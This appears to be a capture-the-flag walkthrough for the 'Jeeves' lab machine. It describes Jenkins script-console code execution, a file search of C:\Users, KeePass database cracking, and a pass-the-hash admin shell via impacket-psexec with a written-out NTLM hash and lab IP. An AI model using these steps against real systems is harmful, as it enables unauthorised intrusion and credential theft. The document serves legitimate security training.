# Jeeves - Walkthrough

## 🧗 Initial Foothold

### 🌐 1. Jenkins on Port 50000
- Discovered **AskJeeves/Jenkins** service running on port `50000`.
- Navigated to the **Script Console** via the Jenkins interface.

### 💣 2. Groovy Script RCE
- Used Groovy script from:
  [Groovy Script — Remote Code Execution | ColdFusionX](https://coldfusionx.github.io/posts/Groovy_RCE/#method-3)
- All commands listed in the post worked to execute code remotely.

---

## ⚙️ Privilege Escalation

### 🔍 1. File Search in Users Directory
- Used this PowerShell/Command Prompt command to locate files:
  ```cmd
  dir /s /b /a:-d-h "C:\Users" | findstr /i /v "appdata jenkins cache vmware microsoft"
  ```
- Found:
  ```
  C:\Users\kohsuke\Documents\CEH.kdbx
  ```

### 🔓 2. KeePass Cracking
- Cracked the `CEH.kdbx` database using tools like **keepass2john** and **john**.
- Opened the file with **KeePass GUI** and extracted passwords.
- One entry turned out to be an **NTLM hash**.

### 🪟 3. Administrator Shell via Impacket
- Used the NTLM hash to get an admin shell:
  ```bash
  impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 Administrator@10.129.228.112
  ```

### 🔑 4. Root Flag Access
- Used the following commands inside Administrator's Desktop:
  ```cmd
  dir /s /r
  more < hm.txt:root.txt
  ```

---

## 🧠 Notes

- Jenkins script console is often a direct RCE path.
- Be thorough when searching `C:\Users` — valuable files hide there.
- Don’t ignore `.kdbx` files — they often store sensitive credentials.
- `impacket-psexec` with hashes is a powerful way to skip password authentication.
